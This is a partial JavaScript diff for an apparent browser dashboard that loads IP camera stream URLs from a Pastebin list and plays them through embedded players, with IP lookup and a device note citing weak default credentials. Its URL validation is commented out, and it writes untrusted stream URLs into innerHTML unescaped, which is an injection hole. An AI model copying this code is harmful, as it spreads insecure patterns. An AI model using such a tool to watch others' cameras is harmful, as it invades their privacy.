+            securityRating: 'low',
+            vulnerabilities: [
+                'Weak default credentials',
+                'Lack of HTTPS encryption',
+                'Outdated firmware'
+            ]
+        }
+    }
+};
+
+// DOM Elements
+const DOM = {
+    elements: {},
+    init() {
+        const elements = {
+            cameraList: 'cameraList',
+            addIpForm: 'addIpForm',
+            addIpInput: 'addIpInput',
+            addIpButton: 'addIpButton',
+            sidebar: 'sidebar',
+            clock: 'clock',
+            cameraCount: 'cameraCount',
+            advancedModeButton: 'advancedModeButton'
+        };
+
+        // Get all elements and store them
+        for (const [key, id] of Object.entries(elements)) {
+            const element = document.getElementById(id);
+            if (!element) {
+                console.warn(`Element with id '${id}' not found`);
+            }
+            this.elements[key] = element;
+        }
+        return this;
+    },
+    get(elementKey) {
+        const element = this.elements[elementKey];
+        if (!element) {
+            console.warn(`Element '${elementKey}' not found in DOM cache`);
+        }
+        return element;
+    }
+};
+
+// Override console methods to capture logs
+const originalConsole = {
+    log: console.log,
+    error: console.error,
+    warn: console.warn,
+    info: console.info
+};
+
+// Custom console to track logs
+console.log = function() {
+    const args = Array.from(arguments);
+    globalState.consoleLog.push({
+        type: 'log',
+        time: new Date(),
+        message: args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' ')
+    });
+    updateConsoleOutput();
+    originalConsole.log.apply(console, arguments);
+};
+
+console.error = function() {
+    const args = Array.from(arguments);
+    globalState.consoleLog.push({
+        type: 'error',
+        time: new Date(),
+        message: args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' ')
+    });
+    updateConsoleOutput();
+    originalConsole.error.apply(console, arguments);
+};
+
+console.warn = function() {
+    const args = Array.from(arguments);
+    globalState.consoleLog.push({
+        type: 'warn',
+        time: new Date(),
+        message: args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' ')
+    });
+    updateConsoleOutput();
+    originalConsole.warn.apply(console, arguments);
+};
+
+console.info = function() {
+    const args = Array.from(arguments);
+    globalState.consoleLog.push({
+        type: 'info',
+        time: new Date(),
+        message: args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' ')
+    });
+    updateConsoleOutput();
+    originalConsole.info.apply(console, arguments);
+};
+
+// Helper Functions
+const extractIpFromUrl = (url) => {
+    const match = url.match(/(\d+\.\d+\.\d+\.\d+)/);
+    return match ? match[0] : null;
+};
+
+const createElementWithClass = (tag, className) => {
+    const element = document.createElement(tag);
+    if (className) element.className = className;
+    return element;
+};
+
+const createElementWithHTML = (tag, html, className) => {
+    const element = document.createElement(tag);
+    if (className) element.className = className;
+    element.innerHTML = html;
+    return element;
+};
+
+async function fetchJson(url) {
+    try {
+        console.log(`Fetching JSON from: ${url}`);
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
+
+        const response = await fetch(url, { signal: controller.signal });
+        clearTimeout(timeoutId);
+
+    if (!response.ok) {
+            const errorMessage = await response.text();
+        throw new Error(`HTTP error! Status: ${response.status}, Message: ${errorMessage}`);
+    }
+
+        const data = await response.json();
+        if (!data) {
+            throw new Error('Empty response received');
+        }
+
+        return data;
+    } catch (error) {
+        if (error.name === 'AbortError') {
+            throw new Error('Request timed out');
+        }
+        console.error('Error fetching JSON:', error);
+        throw error;
+    }
+}
+
+// UI Update Functions
+const updateCameraCount = () => {
+    const count = globalState.cameras.length;
+    DOM.get('cameraCount').textContent = `${count} camera${count !== 1 ? 's' : ''}`;
+};
+
+const updateClock = () => {
+    const now = new Date();
+    DOM.get('clock').textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+};
+
+// Remove overlay (if exists)
+const removeOverlay = () => {
+    const overlay = document.getElementById('overlay');
+    if (overlay) {
+        overlay.remove();
+        console.log('Overlay removed.');
+    }
+};
+
+// Draggable Functionality
+const makeDraggable = (windowElement, titlebarElement) => {
+    let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+    let isDragging = false;
+
+    if (!titlebarElement || !windowElement) return;
+
+    titlebarElement.onmousedown = dragMouseDown;
+
+    function dragMouseDown(e) {
+        if (e.target.closest('button')) return; // Don't drag if clicking on a button
+
+        e = e || window.event;
+        e.preventDefault();
+
+        // Bring window to front
+        const highestZIndex = Math.max(
+            ...Array.from(document.querySelectorAll('.window'))
+                .map(w => parseInt(getComputedStyle(w).zIndex) || 0)
+        );
+        windowElement.style.zIndex = highestZIndex + 1;
+
+        pos3 = e.clientX;
+        pos4 = e.clientY;
+        document.onmouseup = closeDragElement;
+        document.onmousemove = elementDrag;
+
+        isDragging = true;
+        windowElement.classList.add('dragging');
+    }
+
+    function elementDrag(e) {
+        if (!isDragging) return;
+
+        e = e || window.event;
+        e.preventDefault();
+        pos1 = pos3 - e.clientX;
+        pos2 = pos4 - e.clientY;
+        pos3 = e.clientX;
+        pos4 = e.clientY;
+
+        // Calculate new position
+        const newTop = windowElement.offsetTop - pos2;
+        const newLeft = windowElement.offsetLeft - pos1;
+
+        // Apply new position
+        windowElement.style.top = newTop + "px";
+        windowElement.style.left = newLeft + "px";
+    }
+
+    function closeDragElement() {
+        document.onmouseup = null;
+        document.onmousemove = null;
+        isDragging = false;
+        windowElement.classList.remove('dragging');
+    }
+};
+
+// Window Controls
+const setupWindowControls = (windowElement) => {
+    if (!windowElement) return;
+
+    // Minimize button
+    const minimizeBtn = windowElement.querySelector('.minimize');
+    if (minimizeBtn) {
+        minimizeBtn.addEventListener('click', () => {
+            const content = windowElement.querySelector('.window-content');
+            if (content) {
+                content.classList.toggle('minimized');
+            }
+        });
+    }
+
+    // Maximize button
+    const maxBtn = windowElement.querySelector('.maximize');
+    if (maxBtn) {
+        maxBtn.addEventListener('click', () => {
+            const icon = maxBtn.querySelector('i');
+            windowElement.classList.toggle('maximized');
+
+            if (windowElement.classList.contains('maximized')) {
+                // Store previous dimensions for restore
+                windowElement.dataset.prevTop = windowElement.style.top;
+                windowElement.dataset.prevLeft = windowElement.style.left;
+                windowElement.dataset.prevWidth = windowElement.style.width;
+                windowElement.dataset.prevHeight = windowElement.style.height;
+                windowElement.dataset.prevZIndex = windowElement.style.zIndex;
+
+                // Change icon
+                icon.classList.remove('fa-expand');
+                icon.classList.add('fa-compress');
+
+                // Maximize
+                windowElement.style.top = '0';
+                windowElement.style.left = '0';
+                windowElement.style.width = '100%';
+                windowElement.style.height = '100%';
+
+                // Bring to front
+                const highestZIndex = Math.max(
+                    1000,
+                    ...Array.from(document.querySelectorAll('.window'))
+                        .map(w => parseInt(getComputedStyle(w).zIndex) || 0)
+                ) + 10;
+                windowElement.style.zIndex = highestZIndex;
+            } else {
+                icon.classList.remove('fa-compress');
+                icon.classList.add('fa-expand');
+
+                // Restore previous dimensions
+                windowElement.style.top = windowElement.dataset.prevTop || '';
+                windowElement.style.left = windowElement.dataset.prevLeft || '';
+                windowElement.style.width = windowElement.dataset.prevWidth || '';
+                windowElement.style.height = windowElement.dataset.prevHeight || '';
+                windowElement.style.zIndex = windowElement.dataset.prevZIndex || '';
+                windowElement.style.borderRadius = '';
+            }
+        });
+    }
+
+    // Close button
+    const closeBtn = windowElement.querySelector('.close');
+    if (closeBtn) {
+        closeBtn.addEventListener('click', () => {
+            windowElement.classList.add('closing');
+            setTimeout(() => {
+                windowElement.remove();
+
+                // If this is the advanced dashboard, update the state
+                if (windowElement.id === 'advancedDashboard') {
+                    globalState.advancedMode = false;
+                    return;
+                }
+
+                // Update active windows list
+                const windowId = windowElement.dataset.id;
+                globalState.activeWindows = globalState.activeWindows.filter(w => w !== windowId);
+
+                // Clean up resize observer if it exists
+                if (windowId && globalState.resizeObservers[windowId]) {
+                    globalState.resizeObservers[windowId].observer.disconnect();
+                    if (globalState.resizeObservers[windowId].timeout) {
+                        clearTimeout(globalState.resizeObservers[windowId].timeout);
+                    }
+                    delete globalState.resizeObservers[windowId];
+                }
+
+                // Update the advanced dashboard if open
+                if (globalState.advancedMode) {
+                    updateDashboardContent();
+                }
+            }, 300);
+        });
+    }
+};
+
+// Setup tabs
+const setupTabs = (windowElement) => {
+    if (!windowElement) return;
+
+    const tabButtons = windowElement.querySelectorAll('.tab-button');
+
+    tabButtons.forEach(button => {
+        button.addEventListener('click', () => {
+            // Remove active class from all tabs
+            windowElement.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
+            windowElement.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+
+            // Add active class to clicked tab
+            button.classList.add('active');
+
+            // Show related content
+            const tabId = button.dataset.tab;
+            const tabContent = windowElement.querySelector(`#${tabId}`);
+            if (tabContent) {
+                tabContent.classList.add('active');
+            }
+        });
+    });
+};
+
+// Function to add a camera to the list
+const addCamera = (url) => {
+    // Check if camera already exists
+    if (globalState.cameras.includes(url)) {
+        console.log('Camera already exists in the list');
+        return false;
+    }
+
+    // Add to state - add to end of array for original order
+    globalState.cameras.push(url);
+
+    // Create list item
+    const listItem = createElementWithHTML('li',
+        `<i class="fas fa-video"></i> ${url}`,
+        'camera-list-item'
+    );
+
+    // Add click event
+    listItem.addEventListener('click', () => openVideoWindow(url));
+
+    // Add to DOM at the end to maintain original order
+    DOM.get('cameraList').appendChild(listItem);
+
+    // Update counts
+    updateCameraCount();
+
+    return true;
+};
+
+// Main Functionality
+document.getElementById('addIpForm').addEventListener('submit', (event) => {
+    event.preventDefault();
+
+    const ipInput = document.getElementById('addIpInput').value.replace(/[\r\n\t]/g, '').trim();
+
+    // Validate URL format
+    const rtspRegex = /^rtsp:\/\/(:\S*)?@?(\d{1,3}\.){3}\d{1,3}:\d{1,5}(\/.*)?$/;
+    const mjpgRegex = /^https?:\/\/(:\S*)?@?(\d{1,3}\.){3}\d{1,3}(:\d{1,5})?(\/.*)?$/;
+
+    // if (!rtspRegex.test(ipInput) && !mjpgRegex.test(ipInput)) {
+    // alert('Invalid URL format. Please use a valid RTSP or HTTP stream URL.');
+    //     return;
+    // }
+
+    // Add camera to list
+    if (addCamera(ipInput)) {
+        // Clear input field
+        document.getElementById('addIpInput').value = '';
+    }
+});
+
+// Fetch Content Functions
+const fetchPastebinContent = async (url) => {
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+        const response = await fetch(API_ENDPOINTS.CORS_PROXY, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ url: url }),
+            signal: controller.signal
+        });
+
+        clearTimeout(timeoutId);
+
+        if (!response.ok) {
+            const errorMessage = await response.text();
+            throw new Error(`HTTP error! Status: ${response.status}, Message: ${errorMessage}`);
+        }
+
+        const data = await response.json();
+        if (!data || !data.contents) {
+            throw new Error('Invalid response format from proxy server');
+        }
+
+        return data.contents;
+    } catch (error) {
+        if (error.name === 'AbortError') {
+            console.error('Pastebin request timed out');
+            return '';
+        }
+        console.error('Error fetching Pastebin content:', error);
+        return '';
+    }
+};
+
+// Loading message - simplified version
+function showLoadingMessage(isLoading) {
+    let loadingElement = document.getElementById('loading-message');
+
+    if (isLoading) {
+        if (!loadingElement) {
+            loadingElement = document.createElement('div');
+            loadingElement.id = 'loading-message';
+            loadingElement.className = 'loading-message';
+            loadingElement.innerHTML = `<div class="spinner"></div><span>Loading camera list...</span>`;
+            document.body.appendChild(loadingElement);
+        }
+        loadingElement.classList.add('visible');
+    } else {
+        if (loadingElement) {
+            loadingElement.classList.remove('visible');
+            if (loadingElement.parentNode) {
+                loadingElement.parentNode.removeChild(loadingElement);
+            }
+        }
+    }
+}
+
+// Update camera list from Pastebin - simplified approach
+const updateCameraListFromPastebin = async (pastebinUrl) => {
+    // Show loading message
+    showLoadingMessage(true);
+
+    // Start a timer to ensure loading message is cleared after a timeout
+    const loadingTimeout = setTimeout(() => {
+        showLoadingMessage(false);
+    }, 10000); // 10 second max loading time
+
+    try {
+    const plainTextContent = await fetchPastebinContent(pastebinUrl);
+    const urls = plainTextContent.split('\n')
+        .map(url => url.replace(/[\r\n\t]/g, '').trim())
+        .filter(url => url !== '');
+
+        // Clear existing list
+    DOM.get('cameraList').innerHTML = '';
+        globalState.cameras = [];
+
+        // Add each camera
+        urls.forEach(url => {
+            addCamera(url);
+        });
+
+        updateCameraCount();
+    } catch (error) {
+        console.error('Error updating camera list:', error);
+    } finally {
+        // Always clear the timeout and hide loading message
+        clearTimeout(loadingTimeout);
+        showLoadingMessage(false);
+    }
+};
+
+// MJPG Stream Helper Functions
+const isMjpgStream = (url) => {
+    const lowerUrl = url.toLowerCase();
+    return lowerUrl.includes('.mjpg') ||
+           lowerUrl.includes('.mjpeg') ||
+           lowerUrl.includes('mjpg/video') ||
+           lowerUrl.includes('mjpeg/video') ||
+           lowerUrl.includes('video.cgi') ||
+           lowerUrl.includes('video.mjpg') ||
+           lowerUrl.includes('video.mjpeg') ||
+           lowerUrl.includes('snapshot.cgi') ||
+           lowerUrl.includes('image.jpg') ||
+           lowerUrl.includes('image.jpeg') ||
+           lowerUrl.includes('cam.jpg') ||
+           lowerUrl.includes('cam.jpeg') ||
+           lowerUrl.includes('stream.jpg') ||
+           lowerUrl.includes('stream.jpeg') ||
+           lowerUrl.includes('live.jpg') ||
+           lowerUrl.includes('live.jpeg') ||
+           lowerUrl.includes('axis-cgi/mjpg') ||
+           lowerUrl.includes('cgi-bin/mjpg') ||
+           (lowerUrl.startsWith('http') && !lowerUrl.startsWith('rtsp'));
+};
+
+const formatMjpgUrl = (url) => {
+    if (isMjpgStream(url)) {
+        // If it's already a proper MJPG URL, return as is
+        if (url.toLowerCase().includes('.mjpg') ||
+            url.toLowerCase().includes('.mjpeg') ||
+            url.toLowerCase().includes('video.cgi') ||
+            url.toLowerCase().includes('snapshot.cgi')) {
+            return url;
+        }
+        return url;
+    }
+
+    // For non-MJPG URLs, try to construct a common MJPG path
+    const baseUrl = url.endsWith('/') ? url.slice(0, -1) : url;
+    return `${baseUrl}/mjpg/video.mjpg`;
+};
+
+// MJPG Player Creation Functions
+const createMjpgImagePlayer = (url) => {
+    const container = document.createElement('div');
+    container.className = 'mjpg-image-container';
+
+    const img = document.createElement('img');
+    img.className = 'mjpg-image-player';
+
+    // Handle mixed content by trying HTTPS first if we're on HTTPS
+    let imageUrl = url;
+    if (window.location.protocol === 'https:' && url.startsWith('http:')) {
+        imageUrl = url.replace('http:', 'https:');
+        console.log('Converting HTTP to HTTPS for mixed content:', imageUrl);
+    }
+
+    // Add cache-busting parameter for better refresh
+    const separator = imageUrl.includes('?') ? '&' : '?';
+    img.src = imageUrl + separator + 't=' + Date.now();
+    img.style.width = '100%';
+    img.style.height = '100%';
+    img.style.objectFit = 'contain';
+    img.alt = 'MJPG Stream';
+
+    // Set up automatic refresh for MJPG streams
+    let refreshInterval;
+    const refreshRate = 1000; // 1 second refresh rate
+
+    const refreshImage = () => {
+        const newTimestamp = Date.now();
+        const baseUrl = imageUrl.split('?')[0].split('&')[0];
+        img.src = baseUrl + separator + 't=' + newTimestamp;
+    };
+
+    // Add error handling
+    img.onerror = (error) => {
+        console.error('MJPG image failed to load:', url, error);
+
+        // Create retry function
+        const retryLoad = () => {
+            const newImg = document.createElement('img');
+            newImg.className = 'mjpg-image-player';
+            newImg.style.width = '100%';
+            newImg.style.height = '100%';
+            newImg.style.objectFit = 'contain';
+            newImg.alt = 'MJPG Stream';
+
+            // Try alternative protocol if current failed
+            let retryUrl = url;
+            if (imageUrl.startsWith('https:') && url.startsWith('http:')) {
+                // If we tried HTTPS and failed, try original HTTP
+                retryUrl = url + (url.includes('?') ? '&' : '?') + 't=' + Date.now();
+                console.log('HTTPS failed, trying original HTTP URL:', retryUrl);
+            } else {
+                // Try with cache-busting parameter
+                retryUrl = imageUrl + (imageUrl.includes('?') ? '&' : '?') + 't=' + Date.now();
+                console.log('Retrying with cache-busting:', retryUrl);
+            }
+
+            newImg.src = retryUrl;
+
+            // Add same error handler
+            newImg.onerror = () => {
+                console.error('MJPG retry failed for:', retryUrl);
+                container.innerHTML = `
+                    <div class="video-error">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <p>Failed to load MJPG stream</p>
+                        <small>${url}</small>
+                        <p style="margin-top: 10px; font-size: 12px; color: #94a3b8;">
+                            Try switching to "MJPG Iframe Player" in Settings tab
+                        </p>
+                    </div>
+                `;
+            };
+
+            newImg.onload = () => {
+                console.log('MJPG stream loaded successfully on retry');
+            };
+
+            container.innerHTML = '';
+            container.appendChild(newImg);
+        };
+
+        container.innerHTML = `
+            <div class="video-error">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Failed to load MJPG stream</p>
+                <small>${url}</small>
+                <div style="margin-top: 10px;">
+                    <button class="retry-btn" style="padding: 5px 10px; background: #e11d48; color: white; border: none; border-radius: 3px; cursor: pointer;">
+                        Retry
+                    </button>
+                </div>
+            </div>
+        `;
+
+        // Add event listener to retry button
+        const retryBtn = container.querySelector('.retry-btn');
+        if (retryBtn) {
+            retryBtn.addEventListener('click', retryLoad);
+        }
+    };
+
+    // Add loading indicator
+    img.onload = () => {
+        console.log('MJPG stream loaded successfully');
+        // Start auto-refresh after first successful load
+        if (!refreshInterval) {
+            refreshInterval = setInterval(refreshImage, refreshRate);
+            console.log('Started MJPG auto-refresh with', refreshRate + 'ms interval');
+        }
+    };
+
+    // Store cleanup function on container for later use
+    container.cleanup = () => {
+        if (refreshInterval) {
+            clearInterval(refreshInterval);
+            refreshInterval = null;
+            console.log('Stopped MJPG auto-refresh');
+        }
+    };
+
+    container.appendChild(img);
+    return container;
+};
+
+const createMjpgIframePlayer = (url) => {
+    const container = document.createElement('div');
+    container.className = 'mjpg-iframe-container';
+    container.style.width = '100%';
+    container.style.height = '100%';
+    container.style.position = 'relative';
+
+    const iframe = document.createElement('iframe');
+    iframe.className = 'mjpg-iframe-player';
+    iframe.frameBorder = '0';
+    iframe.width = '100%';
+    iframe.height = '100%';
+    iframe.src = url;
+    iframe.allowFullscreen = true;
+    iframe.style.border = 'none';
+    iframe.style.display = 'block';
+
+    // Set up refresh mechanism
+    let refreshInterval;
+    const refreshRate = 3000; // 3 seconds
+
+    const refreshIframe = () => {
+        const separator = url.includes('?') ? '&' : '?';
+        iframe.src = url + separator + 't=' + Date.now();
+        console.log('🔄 Refreshed MJPG iframe');
+    };
+
+    // Function to calculate and apply scaling
+    const applyScaling = () => {
+        const containerRect = container.getBoundingClientRect();
+        const containerWidth = containerRect.width;
+        const containerHeight = containerRect.height;
+
+        // Skip if container has no size yet
+        if (containerWidth === 0 || containerHeight === 0) {
+            return;
+        }
+
+        // Assume 640x480 for MJPG streams (common default)
+        const streamWidth = 640;
+        const streamHeight = 480;
+
+        // Calculate scale factors
+        const scaleX = containerWidth / streamWidth;
+        const scaleY = containerHeight / streamHeight;
+
+        // Use the smaller scale to maintain aspect ratio and fit within container
+        const scaleFactor = Math.min(scaleX, scaleY);
+
+        // Apply scaling
+        container.style.setProperty('--scale-factor', scaleFactor);
+        container.classList.add('scale-to-fit');
+
+        console.log(`📐 MJPG scaling: container(${containerWidth.toFixed(0)}x${containerHeight.toFixed(0)}) stream(${streamWidth}x${streamHeight}) scale(${scaleFactor.toFixed(2)})`);
+    };
+
+    // Start refresh after initial load
+    iframe.onload = () => {
+        console.log('✅ MJPG iframe loaded, starting refresh');
+
+        // Apply scaling after a short delay to ensure container is sized
+        setTimeout(applyScaling, 100);
+
+        if (!refreshInterval) {
+            refreshInterval = setInterval(refreshIframe, refreshRate);
+        }
+    };
+
+    // Add error handling for iframe
+    iframe.onerror = () => {
+        console.error('MJPG iframe failed to load:', url);
+        if (refreshInterval) {
+            clearInterval(refreshInterval);
+            refreshInterval = null;
+        }
+        container.innerHTML = `
+            <div class="video-error">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>Failed to load MJPG stream in iframe</p>
+                <small>${url}</small>
+                <p style="margin-top: 10px; font-size: 12px; color: #94a3b8;">
+                    Try switching to "MJPG Image Player" in Settings tab
+                </p>
+            </div>
+        `;
+    };
+
+    // Add resize observer to reapply scaling when container size changes
+    let resizeObserver;
+    if (window.ResizeObserver) {
+        resizeObserver = new ResizeObserver(() => {
+            applyScaling();
+        });
+        resizeObserver.observe(container);
+    }
+
+    // Store cleanup function
+    container.cleanup = () => {
+        if (refreshInterval) {
+            clearInterval(refreshInterval);
+            refreshInterval = null;
+            console.log('🛑 Stopped MJPG iframe refresh');
+        }
+        if (resizeObserver) {
+            resizeObserver.disconnect();
+            console.log('🛑 Stopped MJPG resize observer');
+        }
+    };
+
+    container.appendChild(iframe);
+    console.log('Created MJPG iframe player with refresh for:', url);
+    return container;
+};
+
+const createMjpgPlayer = (url, playerType = 'iframe') => {
+    console.log(`Creating MJPG player (${playerType}) for URL:`, url);
+
+    switch (playerType) {
+        case 'image':
+            return createMjpgImagePlayer(url);
+        case 'iframe':
+        default:
+            return createMjpgIframePlayer(url);
+    }
+};
+
+// Video Window Creation
+const createStreamedianPlayer = (url, resolution) => {
+    const iframe = document.createElement('iframe');
+    iframe.className = 'video-player';
+    iframe.frameBorder = '0';
+    iframe.allowFullscreen = '1';
+    iframe.src = `https://streamedian.com/embed?w=ZXVwLnN0cmVhbWVkaWFuLmNvbQ==&s=${btoa(url)}&r=${btoa(resolution)}`;
+    iframe.width = '100%';
+    iframe.height = '100%';
+    return iframe;
+};
+
+const createFlashphonerPlayer = (url) => {
+    const iframe = document.createElement('iframe');
+    iframe.className = 'video-player';
+    iframe.id = 'fp_embed_player';
+    iframe.frameBorder = '0';
+    iframe.marginWidth = '0';
+    iframe.marginHeight = '0';
+    iframe.allowFullscreen = 'allowfullscreen';
+    iframe.width = '100%';
+    iframe.height = '100%';
+    iframe.scrolling = 'no';
+
+    // Clean the URL by removing any carriage returns or newlines
+    const cleanUrl = url.replace(/[\r\n]+/g, '');
+
+    // Set up the proper WebSocket server URL and WebRTC configuration
+    const wsUrl = 'wss://demo.flashphoner.com:8443';
+    const rtcConfig = encodeURIComponent(JSON.stringify({
+        iceServers: [{
+            urls: ['stun:stun.l.google.com:19302']
+        }],
+        sdpSemantics: 'unified-plan',
+        bundlePolicy: 'max-bundle'
+    }));
+
+    // Add necessary query parameters for better connection handling
+    const queryParams = new URLSearchParams({
+        urlServer: wsUrl,
+        streamName: cleanUrl,
+        mediaProviders: 'WebRTC,MSE',
+        rtcConfig: rtcConfig,
+        useWorker: 'true',
+        receiverType: 'webrtc'
+    });
+
+    iframe.src = `https://demo.flashphoner.com:8888/embed_player?${queryParams.toString()}`;
+
+    // Add required permissions for iframe
+    iframe.allow = "camera; microphone; fullscreen; display-capture; autoplay";
+
+    return iframe;
+};
+
+// Modify the openVideoWindow function to directly add the click handler
+const openVideoWindow = (url) => {
+    // Clean the URL by removing any carriage returns, newlines, or extra whitespace
+    const cleanUrl = url.replace(/[\r\n\t]/g, '').trim();
+    console.log('[openVideoWindow] Opening video window for URL:', cleanUrl);
+
+    // Generate a unique ID for this window
+    const windowId = 'window-' + Date.now();
+    console.log('[openVideoWindow] Generated window ID:', windowId);
+
+    // Clone the template
+    const template = document.getElementById('videoWindowTemplate');
+    const newWindow = template.content.cloneNode(true).querySelector('.window');
+
+    // Set window ID and store original stream URL
+    newWindow.dataset.id = windowId;
+    newWindow.dataset.streamUrl = cleanUrl;
+    console.log('[openVideoWindow] Created window element with dataset:', newWindow.dataset);
+
+    // Set window title
+    newWindow.querySelector('.video-title').textContent = cleanUrl;
+
+    // Calculate position (cascade)
+    const offset = 20 * (globalState.activeWindows.length % 5);
+    newWindow.style.top = `${70 + offset}px`;
+    newWindow.style.left = `${350 + offset}px`;
+
+    // Add to active windows
+    globalState.activeWindows.push(windowId);
+
+    // Setup window content - video section
+    const videoContainer = newWindow.querySelector('.video-container');
+
+    // Add to DOM first
+    document.body.appendChild(newWindow);
+
+    // Set explicit dimensions for the video window
+    newWindow.style.width = '850px';
+    newWindow.style.height = '600px';
+
+    if (isMjpgStream(cleanUrl)) {
+        // For MJPG streams, use the improved MJPG player
+        const mjpgUrl = formatMjpgUrl(cleanUrl);
+
+        // Update status bar to show MJPG stream
+        const statusResolution = newWindow.querySelector('.stream-resolution');
+        if (statusResolution) {
+            statusResolution.textContent = 'MJPG Stream';
+        }
+
+        // Setup player selection for MJPG streams
+        const playerSelects = newWindow.querySelectorAll('.player-select');
+        playerSelects.forEach(playerSelect => {
+            if (playerSelect) {
+                // Update options for MJPG streams
+                playerSelect.innerHTML = `
+                    <option value="mjpg-image">MJPG Image Player</option>
+                    <option value="mjpg-iframe">MJPG Iframe Player</option>
+                `;
+
+                // Set default MJPG player preference
+                const mjpgPlayerPreference = globalState.mjpgPlayerPreference || 'mjpg-image';
+                playerSelect.value = mjpgPlayerPreference;
+
+                // Add change event listener for MJPG player switching
+                playerSelect.addEventListener('change', (e) => {
+                    globalState.mjpgPlayerPreference = e.target.value;
+                    // Update both dropdowns to stay in sync
+                    playerSelects.forEach(select => {
+                        select.value = e.target.value;
+                    });
+
+                    // Replace the current player with the new one
+                    const currentPlayer = videoContainer.querySelector('.mjpg-image-container, .mjpg-iframe-container');
+                    if (currentPlayer) {
+                        // Clean up any intervals before removing
+                        if (currentPlayer.cleanup) {
+                            currentPlayer.cleanup();
+                        }
+                        currentPlayer.remove();
+                    }
+
+                    const playerType = e.target.value.replace('mjpg-', '');
+                    const newPlayer = createMjpgPlayer(mjpgUrl, playerType);
+                    videoContainer.appendChild(newPlayer);
+
+                    // Show notification
+                    showNotification(`<i class="fas fa-exchange-alt"></i> Switched to ${e.target.value} player`);
+                });
+            }
+        });
+
+        // Create initial MJPG player
+        const mjpgPlayerType = (globalState.mjpgPlayerPreference || 'mjpg-image').replace('mjpg-', '');
+        const mjpgPlayer = createMjpgPlayer(mjpgUrl, mjpgPlayerType);
+        videoContainer.appendChild(mjpgPlayer);
+
+    } else {
+        // Handle RTSP streams with existing player logic
+        // Get the appropriate resolution based on global settings
+        let resolution = globalState.autoResolution
+            ? calculateOptimalResolution(videoContainer.clientWidth, videoContainer.clientHeight)
+            : globalState.manualResolution;
+
+        // Fallback to a safe value if calculation fails
+        if (!resolution) resolution = "720x420";
+
+        // Update resolution in status bar
+        const statusResolution = newWindow.querySelector('.stream-resolution');
+        if (statusResolution) {
+            statusResolution.textContent = resolution;
+        }
+
+        // Setup player selection in settings tab and overlay
+        const playerSelects = newWindow.querySelectorAll('.player-select');
+        playerSelects.forEach(playerSelect => {
+            if (playerSelect) {
+                playerSelect.value = globalState.playerPreference;
+
+                // Add change event listener
+                playerSelect.addEventListener('change', (e) => {
+                    globalState.playerPreference = e.target.value;
+                    // Update both dropdowns to stay in sync
+                    playerSelects.forEach(select => {
+                        select.value = e.target.value;
+                    });
+                    updateRtspStreamResolution(newWindow, cleanUrl, resolution);
+
+                    // Show notification
+                    showNotification(`<i class="fas fa-exchange-alt"></i> Switched to ${e.target.value} player`);
+                });
+            }
+        });
+
+        // Create initial player
+        const player = globalState.playerPreference === 'streamedian'
+            ? createStreamedianPlayer(cleanUrl, resolution)
+            : createFlashphonerPlayer(cleanUrl);
+
+        videoContainer.appendChild(player);
+
+        // If we want to setup resize observer, we can do so here
+        if (globalState.autoResolution) {
+            setupResizeObserver(newWindow, videoContainer, cleanUrl);
+        }
+    }
+
+    // Setup window controls
+    setupWindowControls(newWindow);
+
+    // Make window draggable
+    makeDraggable(newWindow, newWindow.querySelector('.window-titlebar'));
+
+    // Make window resizable
+    makeResizable(newWindow);
+
+    // Setup tabs in the window
+    setupTabsInWindow(newWindow);
+
+    // Extract IP address from URL
+    const ip = extractIpFromUrl(cleanUrl);
+    if (ip) {
+        fetchIPInfo(ip, newWindow);
+    }
+
+    // Update camera data in advanced dashboard if open
+    if (globalState.advancedMode) {
+        updateDashboardContent();
+        populateCurrentIpSelector();
+    }
+
+    // DIRECT METADATA BUTTON HANDLER - This is the key fix
+    const extractMetadataBtn = newWindow.querySelector('.extract-metadata-btn');
+    if (extractMetadataBtn) {
+        console.log('Setting up extract metadata button click handler directly in openVideoWindow');
+        extractMetadataBtn.addEventListener('click', (event) => {
+            event.preventDefault();
+            console.log('Extract metadata button clicked directly');
+
+            // Get the window element (parent of the button)
+            const windowEl = event.target.closest('.window');
+            console.log('Window element from button click:', windowEl);
+
+            if (windowEl) {
+                console.log('Calling extractCameraMetadata function directly');
+
+                // Show loading indicator
+                const loadingIndicator = windowEl.querySelector('.metadata-loading');
+                if (loadingIndicator) {
+                    loadingIndicator.style.display = 'flex';
+                }
+
+                try {
+                    // Call the metadata extraction function
+                    const result = extractCameraMetadata(windowEl);
+                    console.log('Metadata extraction result:', result);
+
+                    // Show notification based on result
+                    if (result.success) {
+                        showNotification('Metadata extraction completed successfully', 'success');
+                    } else {
+                        showNotification(`Metadata extraction failed: ${result.error}`, 'error');
+                    }
+                } catch (error) {
+                    console.error('Error during metadata extraction:', error);
+                    showNotification(`Error during metadata extraction: ${error.message}`, 'error');
+                } finally {
+                    // Hide loading indicator
+                    if (loadingIndicator) {
+                        loadingIndicator.style.display = 'none';
+                    }
+                }
+            } else {
+                console.error('Could not find window element for metadata extraction');
+                showNotification('Could not find window element for metadata extraction', 'error');
+            }
+        });
+    }
+
+    return newWindow;
+};
+
+// Add the setupTabsInWindow function
+const setupTabsInWindow = (windowElement) => {
+    if (!windowElement) return;
+
+    const tabButtons = windowElement.querySelectorAll('.tab-button');
+    const tabContents = windowElement.querySelectorAll('.tab-content');
+
+    tabButtons.forEach(button => {
+        button.addEventListener('click', () => {
+            // Remove active class from all buttons and contents
+            tabButtons.forEach(btn => btn.classList.remove('active'));
+            tabContents.forEach(content => content.classList.remove('active'));
+
+            // Add active class to clicked button
+            button.classList.add('active');
+
+            // Show corresponding content
+            const tabId = button.dataset.tab;
+            const tabContent = windowElement.querySelector(`#${tabId}`);
+            if (tabContent) {
